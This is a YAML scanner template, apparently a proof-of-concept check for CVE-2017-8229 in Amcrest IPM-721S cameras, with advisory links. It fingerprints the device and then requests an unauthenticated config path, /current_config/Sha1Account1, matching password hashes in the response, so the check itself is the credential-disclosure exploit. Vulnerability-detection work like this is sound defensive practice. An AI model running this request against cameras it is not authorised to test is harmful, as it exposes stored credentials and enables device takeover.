name: yaml-poc-amcrest-ipm-721s_firmware-other-CVE-2017-8229
binding: 61499822-cbe5-4288-a11f-0a623db4a524
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/153224/Amcrest-IPM-721S-Credential-Disclosure-Privilege-Escalation.html
        - https://github.com/ethanhunnt/IoT_vulnerabilities/blob/master/Amcrest_sec_issues.pdf
        - https://nvd.nist.gov/vuln/detail/CVE-2017-8229
        - https://seclists.org/bugtraq/2019/Jun/8
    vulnerability:
        id: 09d3333b-bab2-45ee-b8ce-fda90040be75
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
        expression: |
            response.status == 200 && response.body.bcontains(b"Amcrest Technologies")
    r1:
        request:
            cache: true
            method: GET
            path: /current_config/Sha1Account1
        expression: |
            response.status == 200 && response.content_type.contains("application/octet-stream") && "\"Password\" : \"[0-9A-F]{32}\",".bmatches(response.body)
expression: r0() && r1()
